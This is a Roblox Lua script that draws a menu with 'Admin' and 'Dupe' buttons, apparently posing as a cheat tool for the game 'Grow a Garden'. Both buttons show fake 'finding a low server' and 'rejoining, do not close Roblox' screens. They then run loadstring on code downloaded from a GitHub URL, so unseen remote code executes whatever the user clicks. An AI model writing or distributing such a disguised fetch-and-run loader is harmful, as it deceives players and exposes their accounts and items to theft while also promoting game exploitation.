local ScreenGui = Instance.new("ScreenGui")
local LoadingFrame = Instance.new("Frame")
local LoadingText = Instance.new("TextLabel")
local AdminButton = Instance.new("TextButton")
local DupeButton = Instance.new("TextButton")

-- Properties for the ScreenGui
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Properties for the Loading Frame
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.Position = UDim2.new(0, 0, 0, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
LoadingFrame.Visible = false
LoadingFrame.Parent = ScreenGui

-- Properties for the Loading Text
LoadingText.Size = UDim2.new(1, 0, 0.2, 0)
LoadingText.Position = UDim2.new(0, 0, 0.4, 0)
LoadingText.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
LoadingText.TextScaled = true
LoadingText.Parent = LoadingFrame

-- Properties for the Main Frame
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0.4, 0, 0.4, 0)
Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
Frame.Parent = ScreenGui

-- Properties for the Admin Button
AdminButton.Size = UDim2.new(0.8, 0, 0.2, 0)
AdminButton.Position = UDim2.new(0.1, 0, 0.1, 0)
AdminButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
AdminButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
AdminButton.TextScaled = true
AdminButton.Parent = Frame

-- Properties for the Dupe Button
DupeButton.Size = UDim2.new(0.8, 0, 0.2, 0)
DupeButton.Position = UDim2.new(0.1, 0, 0.4, 0)
DupeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
DupeButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
DupeButton.TextScaled = true
DupeButton.Parent = Frame

-- Function to show loading screen and execute loadstring
local function showLoadingScreen(message)
    LoadingFrame.Visible = true
    LoadingText.Text = message
    wait(2) -- Wait for 2 seconds to simulate loading
end

local function executeLoadstring()
    showLoadingScreen("Finding a Low Server Please Wait...")
    showLoadingScreen("Rejoining Server Please Do not Close Roblox!")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
end

-- Button click events
AdminButton.MouseButton1Click:Connect(executeLoadstring)
DupeButton.MouseButton1Click:Connect(executeLoadstring)
